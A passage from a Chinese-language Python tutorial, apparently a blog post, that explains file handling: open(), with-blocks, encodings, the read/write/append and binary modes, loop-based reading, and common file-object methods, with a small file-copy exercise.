class="line"><span class="built_in">open</span>(<span class="string">r&#x27;E:\project\python\s29code\day11\1.打开文件.py&#x27;</span>)</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;相对路径&#x3D;&#x3D;就是以当前文件所在的文件夹为基础，然后找文件，所以也只能找到同文件夹下的文件<br>##2、 操作文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 打开文件，由应用程序向操作系统发起系统调用open(...)，</span></span><br><span class="line"><span class="comment">#    操作系统打开该文件，对应一块硬盘空间，并返回一个文件对象赋值给一个变量f</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>,moder=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#默认打开模式就为r</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 调用文件对象的读/写方法，会被操作系统转换为读/写硬盘的操作</span></span><br><span class="line">data=f.read()  <span class="comment"># 读取文件内容,将硬盘中的二进制数据读取到内存中 --&gt; t控制将二进制转换成字符</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/27e873af16b7114d112f9862f9c3298f.png" alt="image-20200811164602250"><br>##3、 关闭文件</p><p>打开一个文件包含两部分资源：应用程序的变量f和操作系统打开的文件。在操作完毕一个文件时，必须把与该文</p><p>件的这两部分资源全部回收，回收方法为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、f.close() <span class="comment">#回收操作系统打开的文件资源，一旦关闭就不能操作了，但是f变量还在</span></span><br><span class="line"><span class="number">2</span>、<span class="keyword">del</span> f <span class="comment">#回收应用程序级的变量，一般我们不用写。</span></span><br></pre></td></tr></table></figure><p>其中del f一定要发生在f.close( ) 之后，否则就会导致操作系统打开的文件无法关闭，白白占用资源， 而python</p><p>自动的垃圾回收机制决定了我们无需考虑del f，这就要求我们，在操作完毕文件后，一定要记住f.close( )。</p><p><strong>一个简单的示例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;D:\1.txt&quot;</span>,mode=<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>如果你在代码中要写上 很多的打开文件 , 是不是也要写很多的关闭文件 , 那么f.colse 一直重复 , 有无方法介绍写这部分的代码呢? 看下面<br>##4、 with上下文管理器</p><blockquote><p>with上文帮你打开文件,下文就是帮你自动关闭文件.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    res = f1.read()   <span class="comment"># 读取文件内容,硬盘的搬运工</span></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f1称之为文件对象/文件句柄,就是用来控制文件的</span></span><br><span class="line"><span class="comment"># 当with语句的代码块执行完毕后会自动执行f.close()</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开多个文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f1,\</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&#x27;11.txt&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    res1 = f1.read()  <span class="comment"># 读取文件内容</span></span><br><span class="line">    res2 = f2.read()</span><br><span class="line">    <span class="built_in">print</span>(res1)</span><br><span class="line">    <span class="built_in">print</span>(res2)</span><br></pre></td></tr></table></figure><h2 id="5、-指定操作文件的字符编码"><a href="#5、-指定操作文件的字符编码" class="headerlink" title="5、 指定操作文件的字符编码"></a>5、 指定操作文件的字符编码</h2><p>open功能还有一个参数就是<code>encoding=&#39;解码格式&#39;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;a.txt&#x27;</span>, mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    res = f1.read()   <span class="comment"># t模式会将f.read()读出来的结果解码成unicode</span></span><br><span class="line">    <span class="built_in">print</span>(res, <span class="built_in">type</span>(res))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 内存: utf-8格式的二进制 ----&gt; 解码 ----&gt;  unicode</span></span><br><span class="line"><span class="comment"># 硬盘(a.txt内容: utf-8格式的二进制)</span></span><br></pre></td></tr></table></figure><p>如果你不指定encoding参数的话，操作系统会使用自己的默认编码进行解码。</p><ul><li>mac&#x2F;linux         utf-8</li><li>windows           gbk</li></ul><h1 id="三、文件的操作模式"><a href="#三、文件的操作模式" class="headerlink" title="三、文件的操作模式"></a>三、文件的操作模式</h1><h2 id="1、控制文件操作的三种模式"><a href="#1、控制文件操作的三种模式" class="headerlink" title="1、控制文件操作的三种模式"></a>1、控制文件操作的三种模式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r(默认的)：只读</span><br><span class="line">w：只写</span><br><span class="line">a：只追加写</span><br></pre></td></tr></table></figure><h3 id="（1）-r-模式的使用"><a href="#（1）-r-模式的使用" class="headerlink" title="（1） r 模式的使用"></a>（1） r 模式的使用</h3><p>r （默认的操作模式）：只读模式，当文件不存在时，会报错。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;d.txt&#x27;</span>, mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    res = f1.read()</span><br><span class="line">    <span class="built_in">print</span>(res, <span class="built_in">type</span>(res))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 运行结果:</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;E:/project/python/s29code/day11/2.r模式.py&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;d.txt&#x27;</span>, mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;d.txt&#x27;</span></span><br></pre></td></tr></table></figure><p>当文件存在时，文件指针跳到开始位置，所以当我们<code>f.read()</code>时会把文件指针从头读到尾，即一次性</p><p>把文件内容全部从硬盘加载到内存中。注意：&#x3D;&#x3D;大文件不能这样读，如果内容过大，会撑爆内存&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.txt</span></span><br><span class="line">你好啊</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;a.txt&#x27;</span>, mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    res = f1.read() <span class="comment"># 把所有内容从硬盘读入内存</span></span><br><span class="line">    <span class="built_in">print</span>(res) <span class="comment"># 你好啊  </span></span><br></pre></td></tr></table></figure><h3 id="（2）w模式的使用"><a href="#（2）w模式的使用" class="headerlink" title="（2）w模式的使用"></a>（2）w模式的使用</h3><p>w模式，是只写模式，当文件不存在的时候，用w模式打开的话，会自动在该路径创建一个新的文件。</p><p>当文件存在时，w模式会先清空原来的内容，指针位于开始位置，然后再写内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;e.txt&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    f1.write(<span class="string">&quot;你好&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意：w模式不是覆盖，可以自己尝试一下，假设原文件的内容很多，你用w模式打开，然后只写一个字符</p><p>试试。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/faa11788d40dd8dbd1d14829029c7be7.png" alt="image-20200819165616241"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/800ddbed1b17c436e22a2bbf10d1bce8.png" alt="image-20200819165629041"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/144b9a27b792b1bb58ee33014a2e7544.png" alt="image-20200819165648668"></p><p>但是如果我们用w模式没有关闭，连续写入内容的话，不会清空之前的内容，并紧跟在旧的内容后面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;大笨蛋\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;大傻子\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;二杆子&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b.txt</span></span><br><span class="line">大笨蛋</span><br><span class="line">大傻子</span><br><span class="line">二杆子</span><br></pre></td></tr></table></figure><h3 id="（3）-a模式的使用"><a href="#（3）-a模式的使用" class="headerlink" title="（3） a模式的使用"></a>（3） a模式的使用</h3><p>a模式是只追加写模式，当文件不存在时，和w模式一样，会创建新文件。</p><p>当文件存在的时候，a模式打开文件，不会清空原文件的内容，指针会自动移到文件末尾。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;c.txt&#x27;</span>,mode=<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;我是第一行\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># c.txt</span></span><br><span class="line">我是第一行</span><br></pre></td></tr></table></figure><p>当文件没有关闭的情况，用a模式持续写入的话，是和w模式一样的，新内容会紧跟旧内容的后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;c.txt&#x27;</span>,mode=<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;我是第一行\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;我是第二行\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;我是第三行\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;我是第四行\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># c.txt</span></span><br><span class="line">我是第一行</span><br><span class="line">我是第二行</span><br><span class="line">我是第三行</span><br><span class="line">我是第四行</span><br></pre></td></tr></table></figure><p>a模式和w模式的异同点：</p><ul><li>相同点：只能写，不能读，当文件没有关闭时，连续写入，新内容紧跟在就内容之后</li><li>不同点：a模式打开已存在的文件，不会清空原文件内容，指针自动移动到文件末尾</li></ul><p>w模式和a模式的应用场景：</p><ul><li><p>w模式一般用于新文件的保存，比如copy文件底层就是把一个文件读出来，然后用w写入到新文件</p></li><li><p>a模式则是适用于在原文件的基础上写新内容，比如记录日志，用户注册记录文件</p></li></ul><h3 id="（4）了解-模式"><a href="#（4）了解-模式" class="headerlink" title="（4）了解+模式"></a>（4）了解+模式</h3><blockquote><p>+模式，不能单独使用，只能和r，w或a模式一起使用</p></blockquote><ul><li>r+   读写模式，基准是r模式，当文件不存在时，用r+打开会报错，指针在开头。</li><li>w+  写读模式，基准是w模式，文件不存在会创建文件，文件存在同样会清空原文件</li><li>a+   追加读模式，基准是a模式，文件不存在会创建文件，指针在末尾</li></ul><h2 id="2、-控制文件内容的两种模式"><a href="#2、-控制文件内容的两种模式" class="headerlink" title="2、 控制文件内容的两种模式"></a>2、 控制文件内容的两种模式</h2><blockquote><p>t（默认的 , 一般不写 ）：文本模式</p><ol><li>读写文件都是以字符串( unicode )为单位的</li><li>只能针对文本文件</li><li>必须指定encoding参数</li></ol><p>b：二进制模式:</p><ol><li>读写文件都是以bytes&#x2F;二进制为单位的</li><li>可以针对所有文件</li><li>一定不能指定encoding参数</li></ol></blockquote><h3 id="（1）-t模式"><a href="#（1）-t模式" class="headerlink" title="（1） t模式"></a>（1） t模式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># t 模式：如果我们指定的文件打开模式为r/w/a，其实默认就是rt/wt/at</span></span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     res=f.read() </span><br><span class="line">     <span class="built_in">print</span>(<span class="built_in">type</span>(res)) <span class="comment"># 输出结果为：&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     s=<span class="string">&#x27;abc&#x27;</span></span><br><span class="line">     f.write(s) <span class="comment"># 写入的也必须是字符串类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#强调：t 模式只能用于操作文本文件,无论读写，都应该以字符串为单位，而存取硬盘本质都是二进制的形式，当指定 t 模式时，内部帮我们做了编码与解码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果我们用t模式打开视频文件的话</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.mp4&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...   <span class="comment"># ...  == pass 这样并不会报错,因为我们只是调用了操作系统的接口,告诉他用rt打开文件</span></span><br><span class="line">          <span class="comment"># 以后用utf-8对读入内存的文件进行解码,但是我们还没有读/写文件,只是打开文件,所以不报错</span></span><br></pre></td></tr></table></figure><h3 id="（2）-b模式"><a href="#（2）-b模式" class="headerlink" title="（2） b模式"></a>（2） b模式</h3><p>同样b模式也是不能单独使用的，必须和r、w、a配合使用，t模式只针对字符文件，而b模式是针对所有文件，包</p><p>包括文本文件，但是一定要注意不能指定encoding参数，否则报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.jpg&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = f.read()   <span class="comment"># 硬盘的二进制读入内存-&gt;b模式下,不做任何转换,直接读入内存</span></span><br><span class="line">    <span class="built_in">print</span>(res,<span class="built_in">type</span>(res)) <span class="comment"># bytes类型 -&gt; 当成二进制</span></span><br><span class="line">    <span class="comment"># b&#x27;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x0C</span></span><br><span class="line">    <span class="comment"># &lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 理论上我们应该读出来的是物理层间的010101这种,但是如果以这种显示的话,不利于阅读,以及操作数据</span></span><br><span class="line"><span class="comment"># 所以python对读出来的内容做了转换,是16进制的显示,平常我们就把当成二进制来看就行了.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = f.read()       <span class="comment"># 把躺在硬盘的二进制直接读出来,不做任何转换</span></span><br><span class="line">    <span class="built_in">print</span>(res,<span class="built_in">type</span>(res)) </span><br><span class="line">    <span class="built_in">print</span>(res.decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 文件是以utf-8编码格式存的,可以进行字符解码</span></span><br></pre></td></tr></table></figure><h1 id="四、循环读取文件的两种方式"><a href="#四、循环读取文件的两种方式" class="headerlink" title="四、循环读取文件的两种方式"></a>四、循环读取文件的两种方式</h1><h2 id="1、-for循环一行一行的读"><a href="#1、-for循环一行一行的读" class="headerlink" title="1、 for循环一行一行的读"></a>1、 for循环一行一行的读</h2><blockquote><p>for循环不但可以循环那些基础数据类型,也可以循环文件句柄, 每次循环,以行为单位</p><p>但是for循环有个局限</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># t模式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印内容:        </span></span><br><span class="line"><span class="comment"># 是可拨打发红包测</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我付款金额日本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 费劲儿家人</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># b模式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印内容:</span></span><br><span class="line"><span class="string">b&#x27;\xe6\x98\xaf\xe5\x8f\xaf\xe6\x8b\xa8\xe6\x89\x93\xe5\x8f\x91\xe7\xba\xa2\xe5\x8c\x85\xe6\xb5\x8b\r\n&#x27;</span>  <span class="comment"># \r\n --&gt; 换行符</span></span><br><span class="line"><span class="string">b&#x27;\xe6\x88\x91\xe4\xbb\x98\xe6\xac\xbe\xe9\x87\x91\xe9\xa2\x9d\xe6\x97\xa5\xe6\x9c\xac\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe8\xb4\xb9\xe5\x8a\xb2\xe5\x84\xbf\xe5\xae\xb6\xe4\xba\xba\r\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe4\xbb\x98\xe9\x87\x91\xe9\xa2\x9d\xe6\x97\xa5\xe5\x93\xa6\xe5\x9b\x9e\xe9\xa1\xbe&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="2、-while循环-了解"><a href="#2、-while循环-了解" class="headerlink" title="2、 while循环(了解)"></a>2、 while循环(了解)</h2><blockquote><p>之前就说过for循环能实现的，while循环也能实现，循环读取文件也是可以的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># t模式和b模式都适用</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        content = f.read(<span class="number">1024</span>) <span class="comment"># 可以指定读取文件内容的大小,以字节为单位</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><h2 id="3、-小练习"><a href="#3、-小练习" class="headerlink" title="3、 小练习"></a>3、 小练习</h2><p>文件拷贝小程序，要求：<strong>字符文件和字节文件都适用</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_path = <span class="built_in">input</span>(<span class="string">&#x27;请输入要拷贝的文件的绝对路径:&#x27;</span>)</span><br><span class="line">new_file_path = <span class="built_in">input</span>(<span class="string">&#x27;请输入新文件的绝对路径:&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f, <span class="built_in">open</span>(new_file_path, mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        f1.write(line)</span><br></pre></td></tr></table></figure><h1 id="五、f-的常用方法"><a href="#五、f-的常用方法" class="headerlink" title="五、f 的常用方法"></a>五、f 的常用方法</h1><h2 id="1、-必须掌握"><a href="#1、-必须掌握" class="headerlink" title="1、 必须掌握"></a>1、 必须掌握</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读操作</span></span><br><span class="line">f.read()  <span class="comment"># 读取所有内容,执行完该操作后，文件指针会移动到文件末尾</span></span><br><span class="line">f.readline()  <span class="comment"># 读取一行内容,光标移动到第二行首部</span></span><br><span class="line">f.readlines()  <span class="comment"># 读取每一行内容, 每一行的内容作为一个元素存放于列表中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 强调：</span></span><br><span class="line"><span class="comment"># f.read()与f.readlines()都是将内容一次性读入内容，如果内容过大会导致内存溢出，若还想将内容全读入内存，则必须分多次读入，有两种实现方式：</span></span><br><span class="line"><span class="comment"># 方式一</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(line) <span class="comment"># 同一时刻只读入一行内容到内存中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式二</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.mp4&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data=f.read(<span class="number">1024</span>) <span class="comment"># 同一时刻只读入1024个Bytes到内存中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写操作</span></span><br><span class="line">f.write(<span class="string">&#x27;1111\n222\n&#x27;</span>)  <span class="comment"># 针对文本模式的写,需要自己写换行符</span></span><br><span class="line">f.write(<span class="string">&#x27;1111\n222\n&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 针对b模式的写,需要自己写换行符</span></span><br><span class="line">f.writelines([<span class="string">&#x27;333\n&#x27;</span>,<span class="string">&#x27;444\n&#x27;</span>])  <span class="comment"># 迭代的将列表的元素写入文件</span></span><br><span class="line">f.writelines([<span class="built_in">bytes</span>(<span class="string">&#x27;333\n&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;444\n&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)]) <span class="comment">#b模式</span></span><br></pre></td></tr></table></figure><h2 id="2、-了解操作"><a href="#2、-了解操作" class="headerlink" title="2、 了解操作"></a>2、 了解操作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f.readable()  <span class="comment"># 文件是否可读</span></span><br><span class="line">f.writable()  <span class="comment"># 文件是否可读</span></span><br><span class="line">f.closed    <span class="comment"># 文件是否关闭</span></span><br><span class="line">f.encoding  <span class="comment"># 如果文件打开模式为b,则没有该属性</span></span><br><span class="line">f.flush()   <span class="comment"># 立刻将文件内容从内存刷到硬盘，一般情况下当所有写操作完毕后，才会写入硬盘，但是我们             # 可以用flush强制写到硬盘</span></span><br><span class="line">f.name      <span class="comment"># 返回文件名称</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
